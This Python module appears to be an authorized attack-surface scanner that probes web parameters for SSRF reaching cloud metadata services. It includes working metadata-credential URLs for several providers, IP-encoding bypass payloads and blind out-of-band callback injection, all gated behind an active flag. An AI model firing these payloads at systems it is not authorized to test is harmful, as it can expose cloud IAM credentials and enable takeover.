#!/usr/bin/env python3
"""
C4 — SSRF → Cloud-Metadata (IMDS) Lane   ★ highest-yield cloud finding ★
========================================================================
The #1 bug-bounty cloud chain (memory: web-api-wstg-domain + cloud-security-
domain): a server-side request-forgery sink that can reach the instance metadata
service (169.254.169.254 / metadata.google.internal) yields IAM credentials →
cloud takeover. Also flags IMDSv1-reachable as a posture finding.

Method (differential-confirmed, like offensive_verify.py — no false positives):
  1. For each SSRF-prone parameter on a discovered endpoint, send a BASELINE
     request (benign value) and record the response fingerprint.
  2. Send ATTACK requests substituting cloud-metadata URLs (+ encoding/DNS-rebind
     bypass variants).
  3. Confirm ONLY when the attack response contains a metadata signature that the
     baseline did NOT (ami-id, iam/security-credentials, computeMetadata, Azure
     instance JSON) — a differential match, never a bare status change.
  4. Blind/OOB mode: inject a per-target callback host so an out-of-band
     interaction can confirm reachability when the response body is not reflected.

SAFETY (authorized-EASM posture):
  * Read-only GET/parameter probes against the TARGET's own endpoints. We do NOT
    connect to 169.254.169.254 ourselves — the *target* is what (mis)issues the
    request; we only observe whether its response leaks metadata.
  * If IAM credentials are reflected, we capture a MASKED preview as evidence and
    STOP — we never use the credential (that hand-off is C6 path-modelling only).
  * All active behaviour is gated by --active (or CLOUD_SSRF_ACTIVE=true).

  python3 ssrf_metadata.py --endpoints out/discovered_endpoints.jsonl \
      --output out/ssrf_metadata.jsonl --active [--oob-domain x.oast.fun]
"""

from __future__ import annotations

import sys as _sys, os as _os
_ROOT = _os.path.dirname(_os.path.dirname(_os.path.abspath(__file__)))
if _ROOT not in _sys.path:
    _sys.path.insert(0, _ROOT)


import argparse
import json
import os
import re
import sys
import time
from dataclasses import asdict, dataclass, field
from pathlib import Path
from typing import Dict, List, Optional, Tuple
from urllib.parse import parse_qs, quote, urlencode, urlparse, urlunparse

try:
    import requests
    from requests.exceptions import RequestException
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False


def log(msg: str) -> None:
    print(f"[ssrf-imds] {msg}", file=sys.stderr, flush=True)


# Parameters most likely to be SSRF sinks (server fetches the value).
SSRF_PARAM_HINTS = re.compile(
    r"^(url|uri|link|src|source|dest|destination|target|redirect|redirect_?uri|"
    r"return|returnto|next|continue|callback|webhook|fetch|load|proxy|image|img|"
    r"imageurl|file|path|feed|rss|host|domain|site|page|remote|resource|data|"
    r"open|window|to|out|view|show|preview|thumbnail|avatar|upload_?url|"
    r"import|from|forward)$", re.I)

# Cloud metadata endpoints + the response signatures that PROVE we reached them.
# (label, url, extra_headers_note, signature_regex)
METADATA_TARGETS: List[Tuple[str, str, str, re.Pattern]] = [
    ("aws-imdsv1-iam",
     "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
     "none (IMDSv1)",
     re.compile(r"AccessKeyId|SecretAccessKey|\"Token\"\s*:|InstanceProfile", re.I)),
    ("aws-imdsv1-meta",
     "http://169.254.169.254/latest/meta-data/",
     "none (IMDSv1)",
     re.compile(r"ami-id|instance-id|iam/|hostname|public-keys|"
                r"security-credentials", re.I)),
    ("aws-imdsv1-userdata",
     "http://169.254.169.254/latest/user-data",
     "none (IMDSv1)",
     re.compile(r"#!/bin/|#cloud-config|export AWS|aws_access", re.I)),
    ("gcp-metadata",
     "http://metadata.google.internal/computeMetadata/v1/instance/"
     "service-accounts/default/token",
     "requires Metadata-Flavor: Google",
     re.compile(r"access_token|computeMetadata|\"expires_in\"", re.I)),
    ("gcp-metadata-recursive",
     "http://metadata.google.internal/computeMetadata/v1/?recursive=true",
     "requires Metadata-Flavor: Google",
     re.compile(r"computeMetadata|serviceAccounts|numericProjectId", re.I)),
    ("azure-imds",
     "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
     "requires Metadata:true",
     re.compile(r"\"compute\"|\"vmId\"|\"subscriptionId\"|azEnvironment|"
                r"\"resourceGroupName\"", re.I)),
    ("azure-imds-token",
     "http://169.254.169.254/metadata/identity/oauth2/token?api-version="
     "2018-02-01&resource=https://management.azure.com/",
     "requires Metadata:true",
     re.compile(r"access_token|\"token_type\"|\"expires_on\"", re.I)),
    ("alibaba-metadata",
     "http://100.100.100.200/latest/meta-data/",
     "none",
     re.compile(r"instance-id|region-id|ram/security-credentials", re.I)),
    ("do-metadata",
     "http://169.254.169.254/metadata/v1/",
     "none",
     re.compile(r"droplet_id|\"interfaces\"|region", re.I)),
]

# Any of these in a response = leaked IAM credential material (mask + stop).
CRED_LEAK_RE = re.compile(
    r"(AccessKeyId|SecretAccessKey|SessionToken|\"access_token\"\s*:)", re.I)


def _bypass_variants(raw_url: str) -> List[Tuple[str, str]]:
    """Return (variant_label, injected_value) SSRF bypass encodings for a
    metadata URL — the WSTG/bug-bounty bypass set."""
    host_match = re.search(r"://([^/]+)", raw_url)
    variants = [("plain", raw_url)]
    if not host_match:
        return variants
    host = host_match.group(1)
    if host == "169.254.169.254":
        alt_hosts = [
            ("decimal", "2852039166"),          # int form of 169.254.169.254
            ("hex", "0xA9FEA9FE"),
            ("octal", "0251.0376.0251.0376"),
            ("ipv6-mapped", "[::ffff:169.254.169.254]"),
            ("trailing-dot", "169.254.169.254."),
        ]
        for label, alt in alt_hosts:
            variants.append((f"host-{label}", raw_url.replace(host, alt, 1)))
    # URL-encoded scheme obfuscation
    variants.append(("url-encoded", raw_url.replace("http://", "http:%2f%2f", 1)))
    return variants


@dataclass
class SSRFFinding:
    endpoint: str
    parameter: str
    method: str
    metadata_target: str          # which IMDS endpoint was reached
    bypass_variant: str
    severity: str
    confidence: str               # confirmed | oob-pending
    evidence: str
    cred_leak: bool = False
    masked_secret: str = ""
    attack_path_seed: str = "ssrf_to_imds"
    remediation: str = (
        "Enforce IMDSv2 (hop-limit 1, token-required); block link-local "
        "169.254.169.254 egress from app tier; allow-list outbound URLs; "
        "validate/deny user-supplied URLs (no raw fetch of client input).")
    detection_cost: Dict[str, str] = field(default_factory=lambda: {
        "network_layer": "app→169.254.169.254 egress (Zeek conn.log, flow)",
        "cloud_layer": "GuardDuty UnauthorizedAccess:IAMUser/InstanceCredential"
                       "Exfiltration on credential reuse",
    })


class SSRFMetadataScanner:
    def __init__(self, active: bool, timeout: int = 8, oob_domain: str = "",
                 max_targets: int = 400):
        self.active = active
        self.timeout = timeout
        self.oob_domain = oob_domain.strip()
        self.max_targets = max_targets
        self.findings: List[SSRFFinding] = []
        self._sess = requests.Session() if HAS_REQUESTS else None
        if self._sess:
            self._sess.headers.update({"User-Agent": "ARISE-EASM/ssrf-imds"})

    # ---- request helper --------------------------------------------------- #
    def _get(self, url: str) -> Optional[str]:
        if not self._sess:
            return None
        try:
            r = self._sess.get(url, timeout=self.timeout, allow_redirects=False)
            return r.text[:20000]
        except RequestException:
            return None

    def _inject(self, url: str, param: str, value: str) -> str:
        parts = urlparse(url)
        q = parse_qs(parts.query, keep_blank_values=True)
        q[param] = [value]
        new_q = urlencode({k: v[0] for k, v in q.items()})
        return urlunparse(parts._replace(query=new_q))

    # ---- core ------------------------------------------------------------- #
    def test_param(self, url: str, param: str, method: str = "GET") -> None:
        # 1. baseline
        baseline = self._get(self._inject(url, param, "https://example.com/")) or ""
        # 2. each metadata target × bypass variants
        for label, meta_url, _hdr_note, sig in METADATA_TARGETS:
            for variant_label, injected in _bypass_variants(meta_url):
                attack_url = self._inject(url, param, injected)
                body = self._get(attack_url)
                if body is None:
                    continue
                # differential: signature present in attack but not baseline
                if sig.search(body) and not sig.search(baseline):
                    cred = CRED_LEAK_RE.search(body)
                    masked = ""
                    if cred:
                        # mask any obvious secret token near the match
                        m2 = re.search(r"([A-Za-z0-9/+_\-]{16,})", body[cred.end():cred.end()+120])
                        if m2:
                            s = m2.group(1)
                            masked = f"{s[:4]}…{s[-2:]} (len {len(s)})"
                    self.findings.append(SSRFFinding(
                        endpoint=url, parameter=param, method=method,
                        metadata_target=label, bypass_variant=variant_label,
                        severity="critical" if cred else "high",
                        confidence="confirmed",
                        evidence=(f"Param '{param}' fetched {label} ({variant_label}); "
                                  f"response carried metadata signature absent from "
                                  f"baseline. {'IAM CREDENTIAL LEAKED.' if cred else ''}"),
                        cred_leak=bool(cred), masked_secret=masked))
                    log(f"CONFIRMED SSRF→{label} via {param} on {url[:80]} "
                        f"({variant_label})" + (" [CRED LEAK]" if cred else ""))
                    return  # one confirmation per param is enough
        # 3. blind/OOB — inject callback host; confirmation is external
        if self.oob_domain:
            token = f"ssrf-{abs(hash((url, param))) % 10**8}"
            cb = f"http://{token}.{self.oob_domain}/"
            self._get(self._inject(url, param, cb))
            self.findings.append(SSRFFinding(
                endpoint=url, parameter=param, method=method,
                metadata_target="oob-callback", bypass_variant="blind",
                severity="info", confidence="oob-pending",
                evidence=(f"Blind SSRF probe sent to {cb}. Confirm out-of-band: if "
                          f"{token}.{self.oob_domain} received a hit, the param is a "
                          "live SSRF sink — re-run targeted at metadata.")))

    def run(self, targets: List[Tuple[str, str, str]]) -> None:
        if not self.active:
            log("inactive (pass --active or CLOUD_SSRF_ACTIVE=true) — no requests sent")
            return
        if not self._sess:
            log("requests not installed — cannot run")
            return
        tested = 0
        for url, param, method in targets:
            if tested >= self.max_targets:
                log(f"cap {self.max_targets} reached")
                break
            self.test_param(url, param, method)
            tested += 1
        log(f"tested {tested} param-targets")


# --------------------------------------------------------------------------- #
# Target extraction from discovered_endpoints.jsonl
# --------------------------------------------------------------------------- #
def extract_targets(endpoints_path: str) -> List[Tuple[str, str, str]]:
    out: List[Tuple[str, str, str]] = []
    seen = set()
    p = Path(endpoints_path)
    if not p.exists():
        return out
    for line in p.read_text(errors="ignore").splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            rec = json.loads(line)
        except json.JSONDecodeError:
            continue
        url = rec.get("url") or rec.get("endpoint") or ""
        if not url:
            continue
        method = (rec.get("method") or "GET").upper()
        # params from the URL query + any recorded params field
        params = set()
        try:
            for k in parse_qs(urlparse(url).query):
                params.add(k)
        except ValueError:
            pass
        for k in (rec.get("params") or rec.get("parameters") or []):
            if isinstance(k, str):
                params.add(k)
            elif isinstance(k, dict) and k.get("name"):
                params.add(k["name"])
        for param in params:
            if SSRF_PARAM_HINTS.match(param):
                key = (url.split("?")[0], param)
                if key not in seen:
                    seen.add(key)
                    out.append((url, param, method))
    return out


def main() -> int:
    ap = argparse.ArgumentParser(description="C4 SSRF→cloud-metadata (IMDS) lane")
    ap.add_argument("--endpoints", default="",
                    help="discovered_endpoints.jsonl to mine for SSRF-prone params")
    ap.add_argument("--url", default="", help="single URL to test")
    ap.add_argument("--param", default="", help="param name for --url mode")
    ap.add_argument("--output", required=True)
    ap.add_argument("--active", action="store_true",
                    help="actually send probes (gated; also CLOUD_SSRF_ACTIVE=true)")
    ap.add_argument("--oob-domain", default=os.environ.get("CLOUD_SSRF_OOB", ""),
                    help="out-of-band callback domain for blind-SSRF confirmation")
    ap.add_argument("--timeout", type=int, default=8)
    ap.add_argument("--max-targets", type=int, default=400)
    args = ap.parse_args()

    active = args.active or os.environ.get("CLOUD_SSRF_ACTIVE", "").lower() == "true"

    if args.url and args.param:
        targets = [(args.url, args.param, "GET")]
    else:
        targets = extract_targets(args.endpoints)
    log(f"{len(targets)} SSRF-prone param-targets; active={active}")

    scanner = SSRFMetadataScanner(active=active, timeout=args.timeout,
                                  oob_domain=args.oob_domain,
                                  max_targets=args.max_targets)
    scanner.run(targets)

    out = Path(args.output)
    out.parent.mkdir(parents=True, exist_ok=True)
    with out.open("w") as fh:
        for f in scanner.findings:
            fh.write(json.dumps(asdict(f)) + "\n")
    confirmed = sum(1 for f in scanner.findings if f.confidence == "confirmed")
    creds = sum(1 for f in scanner.findings if f.cred_leak)
    log(f"done: {len(scanner.findings)} findings ({confirmed} confirmed, "
        f"{creds} credential leaks) -> {out}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
